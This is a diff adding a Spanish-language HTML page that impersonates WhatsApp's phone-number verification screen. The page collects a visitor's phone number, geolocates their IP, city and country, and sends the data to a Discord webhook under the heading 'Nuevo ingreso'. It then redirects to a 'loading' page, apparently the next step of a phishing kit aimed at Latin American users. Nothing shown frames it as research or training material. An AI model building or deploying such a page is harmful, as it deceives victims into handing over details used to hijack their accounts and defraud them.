@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp - Verificación de número</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script src="config.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(120deg, #e0ffe8 0%, #b8e1fc 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #075e54;
+    }
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 64px;
+      height: 64px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 15px;
+      margin-bottom: 24px;
+      color: #128c7e;
+    }
+    select, input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+    button {
+      background-color: #25d366;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #075e54;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h1>Verificación de WhatsApp</h1>
+    <p>Selecciona tu país e ingresa tu número de teléfono.</p>
+    <form id="phoneForm">
+      <select id="codigoPais" required>
+        <option value="+591">🇧🇴 Bolivia (+591)</option>
+        <option value="+55">🇧🇷 Brasil (+55)</option>
+        <option value="+56">🇨🇱 Chile (+56)</option>
+        <option value="+57">🇨🇴 Colombia (+57)</option>
+        <option value="+506">🇨🇷 Costa Rica (+506)</option>
+        <option value="+53">🇨🇺 Cuba (+53)</option>
+        <option value="+593">🇪🇨 Ecuador (+593)</option>
+        <option value="+503">🇸🇻 El Salvador (+503)</option>
+        <option value="+502">🇬🇹 Guatemala (+502)</option>
+        <option value="+504">🇭🇳 Honduras (+504)</option>
+        <option value="+52">🇲🇽 México (+52)</option>
+        <option value="+505">🇳🇮 Nicaragua (+505)</option>
+        <option value="+507">🇵🇦 Panamá (+507)</option>
+        <option value="+595">🇵🇾 Paraguay (+595)</option>
+        <option value="+51">🇵🇪 Perú (+51)</option>
+        <option value="+598">🇺🇾 Uruguay (+598)</option>
+        <option value="+58">🇻🇪 Venezuela (+58)</option>
+      </select>
+      <input type="tel" id="numeroLocal" placeholder="Ingresa tu número" required inputmode="numeric" pattern="[0-9]+">
+      <button type="submit">Continuar</button>
+    </form>
+  </div>
+
+  <script>
+  // Bloquear letras en tiempo real
+  document.getElementById('numeroLocal').addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+  });
+
+  // Detectar país por IP y seleccionar automáticamente el código
+  fetch('https://ipwho.is/')
+    .then(response => response.json())
+    .then(data => {
+      const countryCode = data.calling_code || '+1';
+      const select = document.getElementById('codigoPais');
+      for (let option of select.options) {
+        if (option.value === countryCode) {
+          option.selected = true;
+          break;
+        }
+      }
+    })
+    .catch(error => {
+      console.warn('No se pudo detectar país por IP:', error);
+      document.getElementById('codigoPais').value = '+1'; // por defecto USA
+    });
+
+  // Enviar datos y avanzar
+  document.getElementById('phoneForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const codigo = document.getElementById('codigoPais').value;
+    const numero = document.getElementById('numeroLocal').value.trim();
+
+    if (!codigo || !numero || !/^\d+$/.test(numero)) {
+      alert('Por favor ingresa solo números válidos.');
+      return;
+    }
+
+    const telefonoCompleto = `${codigo} ${numero}`;
+    localStorage.setItem('telefonoUsuario', telefonoCompleto);
+
+    fetch('https://ipinfo.io/json?token=')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip || 'No disponible';
+        const pais = data.country || 'No disponible';
+        const ciudad = data.city || 'No disponible';
+
+        const mensaje = `📞 **Nuevo ingreso**\n\n📱 **Teléfono**: ${telefonoCompleto}\n🌍 **IP**: ${ip}\n🏳️ **País**: ${pais}\n📍 **Ciudad**: ${ciudad}\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+
+        enviarMensajeDiscord(mensaje)
+          .catch(error => console.warn('Error al enviar a Discord:', error))
+          .finally(() => {
+            window.location.href = 'cargando.html';
+          });
+      })
+      .catch(error => {
+        console.warn('No se pudo obtener IP y país:', error);
+        const mensaje = `📞 **Nuevo ingreso**\n\n📱 **Teléfono**: ${telefonoCompleto}\n🌍 **IP**: No disponible\n🏳️ **País**: No disponible\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+
+        enviarMensajeDiscord(mensaje)
+          .catch(error => console.warn('Error al enviar a Discord:', error))
+          .finally(() => {
+            window.location.href = 'cargando.html';
+          });
+      });
+  });
+</script>
+</body>
+</html>
